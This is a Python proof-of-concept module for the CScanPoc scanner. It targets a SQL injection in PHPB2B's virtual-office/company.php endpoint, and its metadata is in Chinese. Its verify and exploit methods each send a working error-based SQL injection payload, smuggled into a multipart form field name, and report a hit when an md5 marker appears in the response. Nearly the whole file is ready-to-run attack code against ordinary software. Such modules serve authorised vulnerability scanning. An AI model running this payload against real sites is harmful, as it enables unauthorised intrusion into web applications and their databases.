# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPB2B_0003'  # 平台漏洞编号，留空
    name = 'PHPB2B某处注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-23'  # 漏洞公布时间
    desc = '''
        友邻B2B网站系统(PHPB2B)是一款基于PHP程序和Mysql数据库、以MVC架构为基础的开源B2B行业门户电子商务网站建站系统，系统代码完整、开源，功能全面，架构优秀，提供良好的用户体验、多国语言化及管理平台，是目前搭建B2B行业门户网站最好的程序。
        PHPB2B 漏洞文件/virtual-office/company.php
        data[*][*1] 字段名未经过处理。
        Content-Disposition: form-data; name="data[company][name]"
        Content-Disposition: form-data; name="data[company][english_name'']"
        Content-Disposition: form-data; name="data[company][employee_amount]"
        Content-Disposition: form-data; name="data[company][year_annual]"
        Content-Disposition: form-data; name="data[company][manage_type]"
        Content-Disposition: form-data; name="data[company][property]"
        Content-Disposition: form-data; name="data[company][description]"
        Content-Disposition: form-data; name="data[company][main_prod]"
        Content-Disposition: form-data; name="data[company][address]"
        Content-Disposition: form-data; name="data[company][zipcode]"
        Content-Disposition: form-data; name="data[company][boss_name]"
        Content-Disposition: form-data; name="data[company][reg_address]"
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2482/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPB2B'  # 漏洞应用名称
    product_version = '官方最新版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '547719a2-ba01-4d3f-aaa6-c3c904dbcbd7'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            s = requests.session()
            payload = '/virtual-office/company.php'
            data = {
                'data[company][employee_amount FROM pb_thk_companyfields where 1=1 and (select 1 from (select count(*),concat(md5(c),floor(rand(0)*2))x from information_schema.tables group by x)a)#]': (None, '100')
            }
            url = self.target + payload
            r = s.post(url, files=data, allow_redirects=False)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            s = requests.session()
            payload = '/virtual-office/company.php'
            data = {
                'data[company][employee_amount FROM pb_thk_companyfields where 1=1 and (select 1 from (select count(*),concat(md5(c),floor(rand(0)*2))x from information_schema.tables group by x)a)#]': (None, '100')
            }
            url = self.target + payload
            r = s.post(url, files=data, allow_redirects=False)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
